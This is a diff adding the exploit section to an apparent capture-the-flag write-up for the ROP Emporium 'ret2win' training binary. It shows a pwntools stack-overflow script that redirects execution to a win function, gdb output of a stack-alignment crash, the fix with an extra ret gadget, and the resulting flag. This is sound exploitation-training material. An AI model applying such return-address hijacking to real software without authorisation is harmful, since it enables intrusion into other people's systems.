@@ -130,3 +130,91 @@ $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
 We can see that the rbp is stored right after the variable.
 
 # Exploit
+
+Let's send our payload using pwntools :
+
+```python
+from pwn import *
+
+binary = ELF("./ret2win")
+
+offset = 32
+win = binary.sym["ret2win"]
+ret = 0x400755
+
+payload = b"".join([
+    b"A"*offset,
+    b"SAVEDRBP",
+    p64(win),
+])
+
+p = process("./ret2win")
+input("Waiting for debugger...")
+p.recvrepeat(.1)
+p.send(payload)
+p.interactive()
+```
+
+```bash
+┌──(coucou㉿coucou)-[~/Documents/ROP_Emporium/01_ret2win]
+└─$ python3 exploit.py
+[*] '/home/coucou/Documents/ROP_Emporium/01_ret2win/ret2win'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Starting local process './ret2win': pid 12477
+Waiting for debugger...
+[*] Switching to interactive mode
+Thank you!
+Well done! Here's your flag:
+```
+
+We're reaching the ret2win() function, but the program isn't giving us the flag. Let's look at what's going on with gdb :
+
+```gdb
+───────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7f76f9e825f4 <do_system+0144> mov    QWORD PTR [rsp+0x60], r12
+   0x7f76f9e825f9 <do_system+0149> mov    r9, QWORD PTR [rax]
+   0x7f76f9e825fc <do_system+014c> lea    rsi, [rip+0x149a4c]        # 0x7f76f9fcc04f
+ → 0x7f76f9e82603 <do_system+0153> movaps XMMWORD PTR [rsp+0x50], xmm0
+   0x7f76f9e82608 <do_system+0158> mov    QWORD PTR [rsp+0x68], 0x0
+   0x7f76f9e82611 <do_system+0161> call   0x7f76f9f2c230 <__GI___posix_spawn>
+   0x7f76f9e82616 <do_system+0166> mov    rdi, rbx
+   0x7f76f9e82619 <do_system+0169> mov    r12d, eax
+   0x7f76f9e8261c <do_system+016c> call   0x7f76f9f2c130 <__posix_spawnattr_destroy>
+───────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "ret2win", stopped 0x7f76f9e82603 in do_system (), reason: SIGSEGV
+─────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x7f76f9e82603 → do_system(line=0x400943 "/bin/cat flag.txt")
+[#1] 0x40076e → ret2win()
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+The program is running into a sigsegv while trying to execute movaps. This is probably because of a misalignment of the stack. We need to add a ret command before executing ret2win(). Using [this final script](./exploit.py), we get :
+
+```bash
+$ python3 exploit.py
+[*] '/home/coucou/Documents/ROP_Emporium/01_ret2win/ret2win'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Starting local process './ret2win': pid 13293
+[*] Switching to interactive mode
+ret2win by ROP Emporium
+x86_64
+
+For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
+What could possibly go wrong?
+You there, may I have your input please? And don't worry about null bytes, we're using read()!
+
+> Thank you!
+Well done! Here's your flag:
+ROPE{a_placeholder_32byte_flag!}
+[*] Got EOF while reading in interactive
+$ 
+[*] Process './ret2win' stopped with exit code 0 (pid 13293)
+```
